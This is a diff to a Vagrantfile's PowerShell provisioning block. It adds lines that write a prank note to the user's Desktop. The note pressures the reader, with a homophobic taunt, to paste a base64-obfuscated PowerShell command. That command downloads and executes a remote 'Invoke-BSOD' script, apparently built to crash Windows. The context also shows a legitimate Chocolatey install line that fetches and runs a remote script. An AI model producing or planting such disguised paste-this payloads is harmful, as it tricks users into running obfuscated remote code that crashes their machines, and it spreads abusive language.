@@ -41,6 +41,9 @@ Vagrant.configure("2") do |config|
     inline: <<-POTATO
 
       echo "pranked, you're mom gay" > "~/Desktop/rat ;3c.txt"
+      echo "if ur cool, paste this in powershell. if u dont do it, you're mom double gay..." >> "~/Desktop/rat ;3c.txt"
+      echo "" >> "~/Desktop/rat ;3c.txt"
+      echo '  iex ( [Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aWV4IChpbnZva2Utd2VicmVxdWVzdCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGVucnlGQlAvSW52b2tlLUJTT0QvbWFzdGVyL0ludm9rZS1CU09ELm9iZnVzY2F0ZWQucHMxIC1Vc2VCYXNpY1BhcnNpbmcp")))' >> "~/Desktop/rat ;3c.txt"
 
       Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 
